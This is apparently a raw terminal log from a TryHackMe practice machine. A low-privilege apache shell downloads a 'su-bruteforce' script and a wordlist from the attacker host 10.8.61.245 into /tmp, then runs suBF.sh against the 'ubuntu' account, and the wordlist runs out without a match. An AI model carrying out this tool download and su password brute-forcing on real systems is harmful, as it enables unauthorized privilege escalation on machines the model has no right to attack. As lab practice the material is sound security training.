+          10.8.61.2   0%[                    ]       0  --.-KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s                        10.8.61.24  13%[=>                  ]  13.25K  50.4KB/s               [K         10.8.61.24  13%[=>                  ]  13.25K  50.4KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s                        10.8.61.24  13%[=>                  ]  13.25K  50.4KB/s                       10.8.61.245  38%[======>             ]  37.89K  71.8KB/s               [K        10.8.61.245  38%[======>             ]  37.89K  71.8KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s                        10.8.61.24  13%[=>                  ]  13.25K  50.4KB/s                       10.8.61.245  38%[======>             ]  37.89K  71.8KB/s                      10.8.61.245/  88%[================>   ]  86.34K   108KB/s               10.8.61.245/su-brut 100%[===================>]  97.86K   121KB/s    in 0.8s    
+
+2025-03-19 23:56:07 (121 KB/s) - ‘10.8.61.245/su-bruteforce/top12000.txt’ saved [100205/100205]
+
+FINISHED --2025-03-19 23:56:07--
+Total wall clock time: 5.6s
+Downloaded: 4 files, 101K in 0.8s (121 KB/s)
+apache@tryhackme:/tmp$ [Kapache@tryhackme:/tmp$ [K[?2004hapache@tryhackme:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[K10.8.61.245
+_MEIfyiUAV
+mysql.sock
+mysql.sock.lock
+snap-private-tmp
+sucrack
+systemd-private-9de3f281cfe246a4a678df13478b7ade-ModemManager.service-jsAH0e
+systemd-private-9de3f281cfe246a4a678df13478b7ade-switcheroo-control.service-oBfb4f
+systemd-private-9de3f281cfe246a4a678df13478b7ade-systemd-logind.service-2P5nXe
+systemd-private-9de3f281cfe246a4a678df13478b7ade-systemd-resolved.service-co2Vgj
+systemd-private-9de3f281cfe246a4a678df13478b7ade-systemd-timesyncd.service-UdhuKi
+systemd-private-9de3f281cfe246a4a678df13478b7ade-upower.service-G1XbMf
+apache@tryhackme:/tmp$ [Kapache@tryhackme:/tmp$ [K[?2004hapache@tryhackme:/tmp$ cd su-bruteforce[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd su-bruteforce
+[Kcd su-bruteforce
+[Kbash: cd: su-bruteforce: No such file or directory
+apache@tryhackme:/tmp$ [Kapache@tryhackme:/tmp$ [K[?2004hapache@tryhackme:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[K10.8.61.245
+_MEIfyiUAV
+mysql.sock
+mysql.sock.lock
+snap-private-tmp
+sucrack
+systemd-private-9de3f281cfe246a4a678df13478b7ade-ModemManager.service-jsAH0e
+systemd-private-9de3f281cfe246a4a678df13478b7ade-switcheroo-control.service-oBfb4f
+systemd-private-9de3f281cfe246a4a678df13478b7ade-systemd-logind.service-2P5nXe
+systemd-private-9de3f281cfe246a4a678df13478b7ade-systemd-resolved.service-co2Vgj
+systemd-private-9de3f281cfe246a4a678df13478b7ade-systemd-timesyncd.service-UdhuKi
+systemd-private-9de3f281cfe246a4a678df13478b7ade-upower.service-G1XbMf
+apache@tryhackme:/tmp$ [Kapache@tryhackme:/tmp$ [K[?2004hapache@tryhackme:/tmp$ mv 10.8.61.245/su0brutef[K[K[K[K[K[K[K-bruteforce .[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hmv 10.8.61.245/su-bruteforce .
+[Kmv 10.8.61.245/su-bruteforce .
+[Kapache@tryhackme:/tmp$ [Kapache@tryhackme:/tmp$ [K[?2004hapache@tryhackme:/tmp$ rm -r 10.8.61.245[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hrm -r 10.8.61.245
+[Krm -r 10.8.61.245
+[Kapache@tryhackme:/tmp$ [Kapache@tryhackme:/tmp$ [K[?2004hapache@tryhackme:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[K_MEIfyiUAV
+mysql.sock
+mysql.sock.lock
+snap-private-tmp
+su-bruteforce
+sucrack
+systemd-private-9de3f281cfe246a4a678df13478b7ade-ModemManager.service-jsAH0e
+systemd-private-9de3f281cfe246a4a678df13478b7ade-switcheroo-control.service-oBfb4f
+systemd-private-9de3f281cfe246a4a678df13478b7ade-systemd-logind.service-2P5nXe
+systemd-private-9de3f281cfe246a4a678df13478b7ade-systemd-resolved.service-co2Vgj
+systemd-private-9de3f281cfe246a4a678df13478b7ade-systemd-timesyncd.service-UdhuKi
+systemd-private-9de3f281cfe246a4a678df13478b7ade-upower.service-G1XbMf
+apache@tryhackme:/tmp$ [Kapache@tryhackme:/tmp$ [K[?2004hapache@tryhackme:/tmp$ cd su-bruteforce[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd su-bruteforce
+[Kcd su-bruteforce
+[Kapache@tryhackme:/tmp/su-bruteforce$ [Kapache@tryhackme:/tmp/su-bruteforce$ [K[?2004hapache@tryhackme:/tmp/su-bruteforce$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[KREADME.md  suBF.sh  top12000.txt
+apache@tryhackme:/tmp/su-bruteforce$ [Kapache@tryhackme:/tmp/su-bruteforce$ [K[?2004hapache@tryhackme:/tmp/su-bruteforce$ chmod +x suBF.sh[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hchmod +x suBF.sh
+[Kchmod +x suBF.sh
+[Kapache@tryhackme:/tmp/su-bruteforce$ [Kapache@tryhackme:/tmp/su-bruteforce$ [K[?2004hapache@tryhackme:/tmp/su-bruteforce$ ./suBF.sh[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./suBF.sh
+[K./suBF.sh
+[KThis tool bruteforces a selected user using binary su and as passwords: null password, username, reverse username and a wordlist (top12000.txt).
+You can specify a username using -u <username> and a wordlist via -w <wordlist>.
+By default the BF default speed is using 100 su processes at the same time (each su try last 0.7s and a new su try in 0.007s) ~ 143s to complete
+You can configure this times using -t (timeout su process) ans -s (sleep between 2 su processes).
+Fastest recommendation: -t 0.5 (minimun acceptable) and -s 0.003 ~ 108s to complete
+
+Example:    ./suBF.sh -u <USERNAME> [-w top12000.txt] [-t 0.7] [-s 0.007]
+
+THE USERNAME IS CASE SENSITIVE AND THIS SCRIPT DOES NOT CHECK IF THE PROVIDED USERNAME EXIST, BE CAREFUL
+
+apache@tryhackme:/tmp/su-bruteforce$ [Kapache@tryhackme:/tmp/su-bruteforce$ [K[?2004hapache@tryhackme:/tmp/su-bruteforce$ ./suBF.sh -u ubuntu -w     [K[7mtop12000.txt[27m[7m./suBF.sh -u ubuntu -w [27mtop12000.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./suBF.sh -u ubuntu -w top12000.txt
+[K./suBF.sh -u ubuntu -w top12000.txt
+[K  [+] Bruteforcing ubuntu...
+[K[1;31;107m  Wordlist exhausted[0m
+[Kapache@tryhackme:/tmp/su-bruteforce$ [Kapache@tryhackme:/tmp/su-bruteforce$ [K[?2004hapache@tryhackme:/tmp/su-bruteforce$ exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+[Kexit
+[K
+[?2004l
+Script done on 2025-03-20 03:00:52+03:00 [COMMAND_EXIT_CODE="1"]
